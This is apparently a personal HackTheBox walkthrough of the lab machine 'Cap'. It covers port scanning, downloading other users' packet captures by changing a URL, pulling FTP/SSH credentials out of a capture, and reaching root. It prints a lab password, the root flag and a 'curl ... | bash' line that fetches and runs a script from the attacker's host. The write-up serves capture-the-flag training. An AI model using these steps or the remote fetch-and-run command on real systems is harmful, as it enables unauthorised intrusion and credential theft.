
# #HTB 


![[Pasted image 20260103110325.png|300]]


# HTB: Cap - Complete Walkthrough

**Machine IP:** `10.10.10.245`  
**Difficulty:** Easy  
**OS:** Linux



## Step 1: Reconnaissance - Port Scanning

#### RustScan Results:
![[Pasted image 20260103111726.png]]



![[Pasted image 20260103111700.png]]

### Nmap Detailed Scan:

| Port   | Service | Version              |
| ------ | ------- | -------------------- |
| 21/tcp | FTP     | vsftpd 3.0.3         |
| 22/tcp | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP    | Gunicorn             |



## Step 2: Web Enumeration

**Website:** `http://10.10.10.245` - Security Dashboard
The dashboard shows network packet data and has a **Download** feature.

![[Pasted image 20260103120228.png]]

### Vulnerability Discovered:

The web app allows downloading packet capture (PCAP) files. By manipulating the URL, you can access sensitive files.

**Example:** `http://10.10.10.245/data/0` - Downloaded `0.pcap`




## Step 3: FTP Credentials Discovery

Analyzing the downloaded PCAP file with Wireshark reveals:
![[Pasted image 20260103120137.png]]

**Credentials Found:**
- **Username:** `nathan`
- **Password:** `Buck3t4TF0RM3!`



## Step 4: SSH Access

***Why not try FTP?
- ***Because FTP doesn't give you shell access
- ***Because SSH is more powerful
- ***Because SSH is easier to get root access

Why not use FTP? 
- No shell access, may be blocked by server configuration
Why use SSH? 
- Shell access, command execution, privilege escalation possible

![[Pasted image 20260103120400.png]]


**User Flag Location:**
```
nathan@cap:~$ find / -name user.txt 2>/dev/null
/home/nathan/user.txt
nathan@cap:~$ cat /home/nathan/user.txt
[USER_FLAG_HERE]
```

![[Pasted image 20260103120453.png]]


### Using LinPEAS

![[Pasted image 20260103124903.png]]

```
nathan@cap:~$ curl http://10.10.16.13/linpeas.sh | bash
```

![[Pasted image 20260103124931.png]]



![[Pasted image 20260103124831.png]]



![[Pasted image 20260103124951.png]]



## Step 6: Root Flag

![[Pasted image 20260103125827.png]]

```
root@cap:~# cat /root/root.txt
2b9cca18ccf1ac2a9ab0329a9f8fc71b
```





![[Pasted image 20260103125836.png]]

